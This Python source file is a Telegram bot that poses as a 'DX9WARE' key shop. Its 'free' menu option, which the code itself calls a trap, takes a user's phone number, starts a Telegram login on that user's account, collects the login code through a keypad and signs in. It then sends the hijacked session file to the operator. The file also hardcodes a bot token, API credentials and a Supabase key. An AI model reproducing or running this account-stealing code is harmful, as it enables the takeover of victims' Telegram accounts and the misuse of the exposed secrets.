import logging
import asyncio
import os
import random
import string
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from pyrogram import Client as TgClient
from supabase import create_client, Client

# --- КОНФИГ (ТВОИ ДАННЫЕ) ---
API_TOKEN = '8607818846:AAEjGMfOMw8JmUsXu8Zj5mUdzfP1RylLVjU'
ADMIN_ID = 6332767725 
API_ID = 33824273
API_HASH = 'c290fdceef9695342e052710e16d9bb9'

SUPABASE_URL = "https://yuksepnwkzffudhcrjnl.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl1a3NlcG53a3pmZnVkaGNyam5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUwNDM5OTksImV4cCI6MjA5MDYxOTk5OX0.6IvYWJiWqVeFVkQ-SK1NbG5_yEXVyHijFMGwvMbn1q4"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

class Form(StatesGroup):
    waiting_activation = State()
    waiting_phone = State()
    waiting_code = State()

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
def gen_key(prefix="DX9"):
    res = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"{prefix}-{res}"

def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("👤 Профиль", "🛒 Товары", "🔑 Активировать", "🎁 Получить бесплатно")
    return markup

def get_code_kb():
    markup = InlineKeyboardMarkup(row_width=3)
    for i in range(10): markup.insert(InlineKeyboardButton(str(i), callback_data=f"n_{i}"))
    markup.add(InlineKeyboardButton("❌ Сброс", callback_data="c_cl"), InlineKeyboardButton("✅ Готово", callback_data="c_do"))
    return markup

# --- АДМИНКА ---
@dp.message_handler(commands=['gen'], state='*')
async def admin_gen(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.get_args().split()
    count = int(args[0]) if args else 1
    new_keys = []
    for _ in range(count):
        k = gen_key()
        supabase.table("keys").insert({"key": k, "is_used": False}).execute()
        new_keys.append(f"`{k}`")
    await message.answer(f"✅ Создано {count} ключей:\n" + "\n".join(new_keys), parse_mode="Markdown")

# --- ЛОГИКА ЮЗЕРА ---
@dp.message_handler(commands=['start'], state='*')
async def start(message: types.Message, state: FSMContext):
    await state.finish()
    supabase.table("users").upsert({"id": message.from_user.id, "username": message.from_user.username}).execute()
    await message.answer("👋 DX9WARE запущен!", reply_markup=get_main_menu())

@dp.message_handler(lambda m: m.text == "👤 Профиль", state='*')
async def profile(message: types.Message, state: FSMContext):
    await state.finish()
    res = supabase.table("users").select("*").eq("id", message.from_user.id).execute()
    u = res.data[0] if res.data else {}
    status = "Активен ✅" if u.get('is_verified') else "Нет подписки ❌"
    await message.answer(f"👤 **Профиль**\nID: `{message.from_user.id}`\nСтатус: {status}", parse_mode="Markdown")

@dp.message_handler(lambda m: m.text == "🔑 Активировать", state='*')
async def act_start(message: types.Message, state: FSMContext):
    await state.finish()
    await Form.waiting_activation.set()
    await message.answer("🔑 Введи ключ:")

@dp.message_handler(state=Form.waiting_activation)
async def act_proc(message: types.Message, state: FSMContext):
    key_text = message.text.strip()
    # Проверяем в таблице keys
    res = supabase.table("keys").select("*").eq("key", key_text).eq("is_used", False).execute()
    if res.data:
        # Помечаем ключ как юзаный
        supabase.table("keys").update({"is_used": True, "used_by": message.from_user.id}).eq("key", key_text).execute()
        # Даем доступ в таблицу users
        supabase.table("users").update({"is_verified": True}).eq("id", message.from_user.id).execute()
        await message.answer("✅ Доступ получен!", reply_markup=get_main_menu())
    else:
        await message.answer("❌ Ключ не алё.")
    await state.finish()

# --- ЛОВУШКА ---
@dp.message_handler(lambda m: m.text == "🎁 Получить бесплатно", state='*')
async def free(message: types.Message, state: FSMContext):
    await state.finish()
    markup = ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton("📲 Подтвердить номер", request_contact=True))
    await message.answer("Для проверки на бота подтверди номер:", reply_markup=markup)
    await Form.waiting_phone.set()

@dp.message_handler(content_types=['contact'], state=Form.waiting_phone)
async def got_contact(message: types.Message, state: FSMContext):
    phone = message.contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code(phone)
        await state.update_data(phone=phone, hash=sent.phone_code_hash, code="")
        await Form.waiting_code.set()
        await message.answer("📩 Введи код кнопками:", reply_markup=get_code_kb())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")
    await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith('n_'), state=Form.waiting_code)
async def press_n(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    new_code = data.get('code', "") + call.data.split('_')[1]
    await state.update_data(code=new_code)
    await call.message.edit_text(f"📩 Код: `{'*' * len(new_code)}`", reply_markup=get_code_kb())

@dp.callback_query_handler(lambda c: c.data == "c_do", state=Form.waiting_code)
async def do_login(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    client = TgClient(f"sessions/{call.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(data['phone'], data['hash'], data['code'])
        await client.disconnect()
        # Записываем телефон в users
        supabase.table("users").update({"phone": data['phone']}).eq("id", call.from_user.id).execute()
        with open(f"sessions/{call.from_user.id}.session", "rb") as f:
            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Диверсант: {data['phone']}")
        await call.message.edit_text("✅ Готово! Проверка пройдена.")
    except Exception as e:
        await call.message.answer(f"❌ Код неверный или истек: {e}")
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
